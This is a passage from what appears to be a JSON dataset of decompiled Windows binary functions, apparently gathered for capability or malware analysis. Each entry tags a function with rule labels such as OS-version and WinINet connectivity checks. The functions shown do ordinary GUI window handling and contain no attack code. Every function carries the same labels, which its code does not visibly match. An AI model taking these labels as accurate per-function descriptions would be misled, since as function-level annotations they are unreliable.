((cVar1 != '\\0') || ((var_4h[0xa6] != 0 && (*(iVar3 + 8) != '\\0')))) {\n        (**(*var_4h + 0x44))();\n        if (*(iVar3 + 0x28) == '\\0') {\n            uVar2 = *(var_4h[0xa9] + 8) ^ 1;\n        }\n        else {\n            uVar2 = 0;\n        }\n        if (uVar2 == 0) {\n            *(var_4h[0xa9] + 8) = 0;\n        }\n        else {\n            iStack76 = var_10h - *(iVar3 + 0x18);\n            puStack80 = var_14h - *(iVar3 + 0x14);\n            puStack72 = var_8h;\n            sub.gdi32.dll_ExcludeClipRect();\n        }\n        if (var_4h[0xa6] == 0) {\n            iStack76 = 4;\n            puStack80 = 0x4411cb;\n            puStack80 = sub.gdi32.dll_GetStockObject();\n            puStack80 = fcn.00425694(&fcn.004410d0::var_1ch);\n            sub.user32.dll_FillRect();\n        }\n        else {\n            iStack76 = 0x4411fc;\n            fcn.00424f38();\n            iStack76 = 0x44120f;\n            fcn.00425054();\n            iStack76 = 0x44121a;\n            iStack76 = fcn.004241b0();\n            puStack80 = 0x441229;\n            puStack80 = fcn.00425694();\n            sub.gdi32.dll_SetBkColor();\n            fcn.004252dc();\n        }\n    }\n    *in_FS_OFFSET = puStack80;\n    puStack72 = 0x441262;\n    iStack76 = var_ch;\n    puStack80 = var_8h;\n    sub.gdi32.dll_RestoreDC();\n    return;\n}\n",
        "token_count": 894
    },
    "004415fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004415fc(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) {\n        (**(*in_EAX + -0x10))();\n        return;\n    }\n    fcn.004577dc();\n    return;\n}\n",
        "token_count": 86
    },
    "00441614": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441614(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (((*(param_2 + 4) == 2) && (*(in_EAX + 0x8f) == '\\x01')) && ((*(in_EAX + 7) & 0x10) == 0)) {\n        fcn.00458568();\n        iVar1 = fcn.0043b6cc();\n        if (iVar1 == 0) {\n            uVar2 = fcn.00458568(0, 0, 0, 0, 0, 7);\n            sub.user32.dll_SetWindowPos(uVar2);\n            uVar2 = fcn.00458568(0xa2, *(param_2 + 4), *(param_2 + 8));\n            sub.user32.dll_PostMessageA(uVar2);\n            if (*(in_EAX + 0x276) == '\\0') {\n                return;\n            }\n            (**(*in_EAX + 0x54))();\n            fcn.00450f40();\n            return;\n        }\n    }\n    fcn.00452488();\n    return;\n}\n",
        "token_count": 278
    },
    "0044188c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044188c(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x441927;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x290) != 0) {\n        iVar2 = 0;\n        if ((*(param_2 + 6) != -1) || (puVar1 = &stack0xfffffffc,  *(param_2 + 4) != 0)) {\n            puVar1 = &stack0xfffffffc;\n            if ((*(param_2 + 6) & 0x10) != 0) {\n                in_stack_ffffffd8 = *(param_2 + 8);\n                sub.user32.dll_GetSubMenu(in_stack_ffffffd8, *(param_2 + 4));\n                puVar1 = puStack24;\n            }\n            puStack24 = puVar1;\n            iVar2 = fcn.00437994();\n            puVar1 = puStack24;\n        }\n        puStack24 = puVar1;\n        if (iVar2 == 0) {\n            fcn.00447044();\n            puVar1 = puStack24;\n        }\n        else {\n            fcn.0044d518();\n            fcn.00447044();\n            puVar1 = puStack24;\n        }\n    }\n    puStack24 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    uStack32 = 0x44192e;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 438
    },
    "00441c3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00441c3c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x158) == '\\x01') && (*(in_EAX + 0x160) != 0)) {\n        uVar1 = 1;\n    }\n    else if ((*(in_EAX + 0x158) == '\\0') && (*(in_EAX + 0x15c) != 0)) {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 132
    },
    "00441ca8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00441ca8(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_34h;\n    uint var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uint var_11h;\n    uint var_dh;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack72 = 0x441e12;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    var_4h = param_2;\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        if (*(*(param_2 + 8) + 4) == 1) {\n            puStack68 = &stack0xfffffffc;\n            for (iVar2 = fcn.0044d264(); iVar2 != 0; iVar2 = *(iVar2 + 0x30)) {\n                cVar1 = fcn.00441c3c();\n                if (cVar1 != '\\0') break;\n            }\n            if (iVar2 == 0) goto code_r0x00441dfc;\n            fcn.00441c74(&fcn.00441ca8::var_8h);\n            fcn.00418410();\n            fcn.00450294();\n        }\n        else {\n            var_dh._0_1_ = '\\x01';\n            iVar2 = fcn.00441bfc(&stack0xfffffffc);\n            if (iVar2 == 0) {\n                fcn.00441bfc(&stack0xfffffffc);\n            }\n            fcn.00418410();\n            fcn.00450294();\n        }\n        if (((*(in_EAX + 0x270) & 8) == 0) || (var_dh != '\\x01')) {\n            if (var_dh == '\\x01') {\n                fcn.00446c7c();\n            }\n            else if (var_dh == '\\0') {\n                fcn.00446bec();\n            }\n        }\n        else {\n            fcn.00446d04();\n            fcn.00446d04();\n        }\n    }\ncode_r0x00441dfc:\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x441e19;\n    uStack72 = 0x441e11;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 638
    },
    "00441ec0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441ec0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint var_44h;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    var_4h = in_EAX;\n    if ((((*(in_EAX + 0xd2) != '\\0') && ((in_EAX[0xc] == 0 || ((*(in_EAX + 7) & 0x10) == 0)))) &&\n        ((*(*(param_2 + 8) + 8) != 0 || (*(*(param_2 + 8) + 0xc) != 0)))) &&\n       ((*(*(param_2 + 8) + 0x10) == in_EAX[0x12] && (*(*(param_2 + 8) + 0x14) == in_EAX[0x13])))) {\n        fcn.0043f564();\n        fcn.00443a74();\n        fcn.0043f564();\n        fcn.00443a74();\n        fcn.00441e94(arg_8h);\n        fcn.0043f564();\n        fcn.00443a74();\n        fcn.00441e94(arg_8h_00);\n        fcn.00441e94(&stack0xfffffffc);\n        fcn.00441e94(&stack0xfffffffc);\n    }\n    fcn.00456964();\n    iVar2 = fcn.00447dac();\n    cVar1 = fcn.00448098();\n    if (((cVar1 != '\\0') && (*(iVar2 + 0x28) == '\\0')) && (*(var_4h + 0x57) != '\\0')) {\n        iVar3 = *(param_2 + 8);\n        if ((*(iVar3 + 0x10) != 0) || (*(iVar3 + 0x14) != 0)) {\n            iVar5 = *(iVar3 + 0x10) - var_4h[0x12];\n            iVar3 = *(iVar3 + 0x14) - var_4h[0x13];\n            if ((iVar5 != 0) || (iVar3 != 0)) {\n                (**(*var_4h + 0x44))();\n                fcn.00418438(&var_24h, var_8h - *(iVar2 + 0x18));\n                if ((*(iVar2 + 0x10) < var_18h) || (iVar3 < 1)) {\n                    if (0 < iVar3) {\n                        var_18h = var_18h + iVar3;\n                    }\n                    if (var_18h < var_20h) {\n                        var_18h = var_20h;\n                    }\n                }\n                else {\n                    var_18h = var_20h - iVar3;\n                    var_20h = *(iVar2 + 0x18);\n                    *(var_4h[0xa9] + 8) = 1;\n                }\n                iVar2 = *(iVar2 + 0xc);\n                if ((var_1ch < iVar2) && (0 < iVar5)) {\n                    var_24h = var_1ch - iVar5;\n                    *(var_4h[0xa9] + 8) = 1;\n                    var_1ch = iVar2;\n                }\n                else {\n                    if (0 < iVar5) {\n                        var_1ch = var_1ch + iVar5;\n                    }\n                    if (var_1ch < var_24h) {\n                        var_1ch = var_24h;\n                    }\n                }\n                uVar4 = fcn.00458568(&var_24h, 0);\n                sub.user32.dll_InvalidateRect(uVar4);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1009
    },
    "004421f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004421f0(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *in_FS_OFFSET;\n    uint32_t uStack60;\n    int32_t iStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack52 = &stack0xfffffffc;\n    uStack32 = 0x44284c;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar1 = &stack0xfffffffc;\n    if (((*(in_EAX + 7) & 0x10) == 0) && (puVar1 = &stack0xfffffffc,  (*(in_EAX + 0xd6) & 4) != 0)) {\n        puStack40 = 0x442231;\n        fcn.00407550();\n        puStack40 = 0x442240;\n        fcn.0040daec();\n        puStack40 = 0x442245;\n        fcn.00404ec4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    puStack40 = 0x44224f;\n    fcn.00447134();\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) | 4;\n    uStack44 = 0x44282f;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        if (*(in_EAX + 0x1da) == '\\0') {\n            iStack56 = 0x442701;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack40 = &stack0xfffffffc;\n            fcn.0040484c();\n            *in_FS_OFFSET = uStack60;\n            if (*(*0x497c20 + 0x6c) == in_EAX) {\n                puStack52 = 0x44272f;\n                fcn.00440f40();\n            }\n            if (*(in_EAX + 0x277) == '\\x01') {\n                puStack52 = 0x442746;\n                (**(*in_EAX + 0xb0))();\n            }\n            else if ((*(in_EAX + 0xd6) & 8) == 0) {\n                iVar7 = 0;\n                puStack52 = 0x442783;\n                iVar3 = fcn.00458568();\n                puStack52 = 0x44278a;\n                iVar6 = sub.user32.dll_GetActiveWindow();\n                if (iVar3 == iVar6) {\n                    puStack52 = 0x442796;\n                    fcn.00458568();\n                    puStack52 = 0x44279b;\n                    iVar3 = fcn.0043b6cc();\n                    if (iVar3 == 0) {\n                        puStack52 = 0x4427a7;\n                        fcn.00458568();\n                        puStack52 = 0x4427ac;\n                        iVar7 = fcn.0043b9f0();\n                    }\n                }\n                if (iVar7 == 0) {\n                    puStack52 = NULL;\n                    iStack56 = 0x4427e1;\n                    iStack56 = fcn.00458568();\n                    uStack60 = 0x4427e7;\n                    sub.user32.dll_ShowWindow();\n                }\n                else {\n                    puStack52 = 0x97;\n                    iStack56 = 0;\n                    uStack60 = 0;\n                    uVar5 = fcn.00458568(0, 0, 0);\n                    sub.user32.dll_SetWindowPos(uVar5);\n                    sub.user32.dll_SetActiveWindow(iVar7);\n                }\n            }\n            else {\n                puStack52 = 0x97;\n                iStack56 = 0;\n                uStack60 = 0;\n                uVar5 = fcn.00458568(0, 0, 0);\n                sub.user32.dll_SetWindowPos(uVar5);\n            }\n        }\n        else {\n            iStack56 = 0x4422a8;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack52 = &stack0xfffffffc;\n            puStack40 = &stack0xfffffffc;\n            fcn.0040484c();\n            *in_FS_OFFSET = uStack60;\n            if ((*(in_EAX + 0x9e) == '\\x04') || ((*(in_EAX + 0x9e) == '\\x06' && (*(in_EAX + 0x277) == '\\x01')))) {\n                if (*(in_EAX + 0x277) == '\\x01') {\n                    puStack52 = 0x442304;\n                    iVar3 = fcn.00450180();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x442320;\n                    iVar3 = fcn.004501c4();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                else {\n                    puStack52 = 0x44233b;\n                    iVar3 = fcn.00443cf4();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x442354;\n                    iVar3 = fcn.00443ce8();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                puStack52 = 0x44236d;\n                iVar3 = fcn.00443d0c();\n                if (iVar6 < iVar3) {\n                    puStack52 = 0x44237b;\n                    fcn.00443d0c();\n                }\n                puStack52 = 0x442387;\n                iVar3 = fcn.00443d00();\n                if (iVar7 < iVar3) {\n                    puStack52 = 0x442395;\n                    fcn.00443d00();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x4423b4;\n                (**(*in_EAX + 0x88))();\n                if (*(in_EAX + 0x57) != '\\0') {\n                    puStack52 = 0x4423c9;\n                    fcn.0043fd64();\n                }\n            }\n            else if (*(in_EAX + 0x9e) - 6U < 2) {\n                iVar3 = *(*0x497c1c + 0x44);\n                if (*(in_EAX + 0x9e) == '\\a') {\n                    puStack52 = 0x44240b;\n                    cVar2 = fcn.004047dc();\n                    if (cVar2 != '\\0') {\n                        iVar3 = in_EAX[1];\n                    }\n                }\n                if (iVar3 == 0) {\n                    puStack52 = 0x44245b;\n                    iVar3 = fcn.00443cf4();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x442474;\n                    iVar3 = fcn.00443ce8();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                else {\n                    puStack52 = 0x442420;\n                    iVar6 = fcn.0043df0c();\n                    uVar4 = *(iVar3 + 0x48) - in_EAX[0x12];\n                    iVar7 = uVar4 >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((uVar4 & 1) != 0);\n                    }\n                    iVar6 = iVar6 + iVar7;\n                    puStack52 = 0x44243b;\n                    iVar7 = fcn.0043df2c();\n                    uVar4 = *(iVar3 + 0x4c) - in_EAX[0x13];\n                    iVar3 = uVar4 >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((uVar4 & 1) != 0);\n                    }\n                    iVar7 = iVar7 + iVar3;\n                }\n                puStack52 = 0x44248d;\n                iVar3 = fcn.00443d0c();\n                if (iVar6 < iVar3) {\n                    puStack52 = 0x44249b;\n                    fcn.00443d0c();\n                }\n                puStack52 = 0x4424a7;\n                iVar3 = fcn.00443d00();\n                if (iVar7 < iVar3) {\n                    puStack52 = 0x4424b5;\n                    fcn.00443d00();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x4424d4;\n                (**(*in_EAX + 0x88))();\n                if (*(in_EAX + 0x57) != '\\0') {\n                    puStack52 = 0x4424e9;\n                    fcn.0043fd64();\n                }\n            }\n            else if (*(in_EAX + 0x9e) == '\\x05') {\n                if (*(in_EAX + 0x277) == '\\x01') {\n                    puStack52 = 0x44250f;\n                    iVar3 = fcn.00450180();\n                    iVar7 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x44252b;\n                    iVar3 = fcn.004501c4();\n                    iVar8 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar8 < 0) {\n                        iVar8 = iVar8 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                else {\n                    puStack52 = 0x442546;\n                    uVar4 = fcn.00443d24();\n                    iVar3 = uVar4 >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((uVar4 & 1) != 0);\n                    }\n                    puStack52 = 0x442559;\n                    iVar6 = fcn.00443d0c();\n                    iVar7 = in_EAX[0x12] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((in_EAX[0x12] & 1U) != 0);\n                    }\n                    iVar7 = (iVar3 + iVar6) - iVar7;\n                    puStack52 = 0x442574;\n                    uVar4 = fcn.00443d18();\n                    iVar3 = uVar4 >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((uVar4 & 1) != 0);\n                    }\n                    puStack52 = 0x442587;\n                    iVar6 = fcn.00443d00();\n                    iVar8 = in_EAX[0x13] >> 1;\n                    if (iVar8 < 0) {\n                        iVar8 = iVar8 + ((in_EAX[0x13] & 1U) != 0);\n                    }\n                    iVar8 = (iVar3 + iVar6) - iVar8;\n                }\n                puStack52 = 0x4425a2;\n                iVar3 = fcn.00443d0c();\n                if (iVar7 < iVar3) {\n                    puStack52 = 0x4425b0;\n                    fcn.00443d0c();\n                }\n                puStack52 = 0x4425bc;\n                iVar3 = fcn.00443d00();\n                if (iVar8 < iVar3) {\n                    puStack52 = 0x4425ca;\n                    fcn.00443d00();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x4425e9;\n                (**(*in_EAX + 0x88))();\n            }\n            *(in_EAX + 0x9e) = 0;\n            if (*(in_EAX + 0x277) == '\\x01') {\n                if (*(in_EAX + 0x273) == '\\x02') {\n                    puStack52 = NULL;\n                    iStack56 = 0x442619;\n                    iStack56 = fcn.00458568();\n                    uStack60 = 0x223;\n                    sub.user32.dll_SendMessageA(*(*(*0x497c1c + 0x44) + 0x29c));\n                    uVar5 = fcn.00458568(3);\n                    sub.user32.dll_ShowWindow(uVar5);\n                }\n                else {\n                    puStack52 = *(*(in_EAX + 0x273) * 4 + 0x49058c);\n                    iStack56 = 0x44265f;\n                    iStack56 = fcn.00458568();\n                    uStack60 = 0x442665;\n                    sub.user32.dll_ShowWindow();\n                    uStack60 = in_EAX[0x12] | in_EAX[0x13] << 0x10;\n                    uVar5 = fcn.00458568(5, 0);\n                    sub.user32.dll_CallWindowProcA(0x407fe8, uVar5);\n                    fcn.00450a68();\n                }\n                iStack56 = *(*(*0x497c1c + 0x44) + 0x29c);\n                sub.user32.dll_SendMessageA();\n            }\n            else {\n                puStack52 = *(*(in_EAX + 0x273) * 4 + 0x49058c);\n                iStack56 = 0x4426d2;\n                iStack56 = fcn.00458568();\n                uStack60 = 0x4426d8;\n                sub.user32.dll_ShowWindow();\n            }\n        }\n    }\n    else if ((((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) && (*(in_EAX + 0x1da) != '\\0')) {\n        puStack52 = 0x1;\n        iStack56 = 0x442811;\n        puStack40 = &stack0xfffffffc;\n        iStack56 = fcn.00458568();\n        uStack60 = 0x442817;\n        sub.user32.dll_ShowWindow();\n    }\n    *in_FS_OFFSET = iStack56;\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) & 0xfb;\n    return;\n}\n",
        "token_count": 3701
    },
    "004428dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004428dc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x59) != '\\0') {\n        if (*(param_2 + 4) == 0) {\n            puStack16 = 0x442908;\n            fcn.004244a8();\n            uStack20 = 0x44293a;\n            uStack24 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            puStack16 = &stack0xfffffffc;\n            (**(**(in_EAX + 0x68) + 8))();\n            *in_FS_OFFSET = uStack24;\n            puStack16 = 0x442941;\n            uStack20 = 0x442939;\n            fcn.00404650();\n            return;\n        }\n        puStack16 = 0x4428fa;\n        (**(**(in_EAX + 0x68) + 8))();\n    }\n    return;\n}\n",
        "token_count": 262
    },
    "00442974": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00442974(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    char cStack12;\n    \n    if ((*(in_EAX + 0xd6) & 8) == 0) {\n        cVar1 = (**(*in_EAX + 0xf4))();\n        if (cVar1 != '\\0') {\n            if (*(in_EAX + 0x277) == '\\x01') {\n                if ((*(in_EAX + 0x9c) & 2) == 0) {\n                    cStack12 = '\\0';\n                }\n                else {\n                    cStack12 = '\\x03';\n                }\n            }\n            else {\n                cStack12 = '\\x01';\n            }\n            fcn.0040484c();\n            if (cStack12 != '\\0') {\n                if (in_EAX == *(*0x497c1c + 0x44)) {\n                    fcn.004466a4();\n                }\n                else if (cStack12 == '\\x01') {\n                    fcn.00442b14();\n                }\n                else if (cStack12 == '\\x03') {\n                    fcn.0043fd24();\n                }\n                else {\n                    fcn.00442bf0();\n                }\n            }\n        }\n    }\n    else {\n        in_EAX[0xa5] = 2;\n    }\n    return;\n}\n",
        "token_count": 306
    },
    "00442b34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00442b34(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x442bb3;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (*(in_EAX + 0x276) != '\\0') goto code_r0x00442b9d;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x57) == '\\0') {\ncode_r0x00442b64:\n        puStack16 = puVar1;\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            cVar2 = fcn.00458874();\n            if (cVar2 != '\\0') goto code_r0x00442b96;\n        }\n        fcn.00407550();\n        fcn.0040daec();\n        fcn.00404ec4();\n    }\n    else {\n        cVar2 = (**(*in_EAX + 0x50))();\n        puVar1 = puStack16;\n        if (cVar2 == '\\0') goto code_r0x00442b64;\n    }\ncode_r0x00442b96:\n    fcn.00440e14();\ncode_r0x00442b9d:\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x442bba;\n    uStack20 = 0x442bb2;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 396
    },
    "00442c0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00442c0c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x442efe;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x442c2f;\n    fcn.0044ed30();\n    if (*(in_EAX + 0x57) == '\\0') {\n        puStack60 = 0x442c40;\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (((cVar1 != '\\0') && ((*(in_EAX + 0xd6) & 8) == 0)) && (*(in_EAX + 0x277) != '\\x01')) goto code_r0x00442c7d;\n    }\n    puStack60 = 0x442c69;\n    fcn.00407550();\n    puStack60 = 0x442c78;\n    fcn.0040daec();\n    puStack60 = 0x442c7d;\n    fcn.00404ec4();\ncode_r0x00442c7d:\n    puStack60 = 0x442c82;\n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar2 != 0) {\n        puStack60 = NULL;\n        uStack64 = 0;\n        uStack68 = 0x1f;\n        puStack72 = 0x442c91;\n        puStack72 = sub.user32.dll_GetCapture();\n        uStack76 = 0x442c97;\n        sub.user32.dll_SendMessageA();\n    }\n    puStack60 = 0x442c9c;\n    sub.user32.dll_ReleaseCapture();\n    puStack60 = 0x442ca6;\n    fcn.00445348();\n    uStack64 = 0x442ee1;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) | 8;\n    puStack60 = &stack0xfffffffc;\n    if ((*(in_EAX + 0xcc) == '\\0') && (puStack60 = &stack0xfffffffc,  *(*0x497c1c + 0xd4) != '\\0')) {\n        puStack72 = 0x442ce0;\n        puStack60 = &stack0xfffffffc;\n        fcn.00454f60();\n        puStack72 = 0x442ce8;\n        fcn.00458544();\n    }\n    puStack72 = 0x442ced;\n    sub.user32.dll_GetActiveWindow();\n    puStack72 = 0x442cf5;\n    fcn.0043b6ec();\n    puStack72 = 0x442d0f;\n    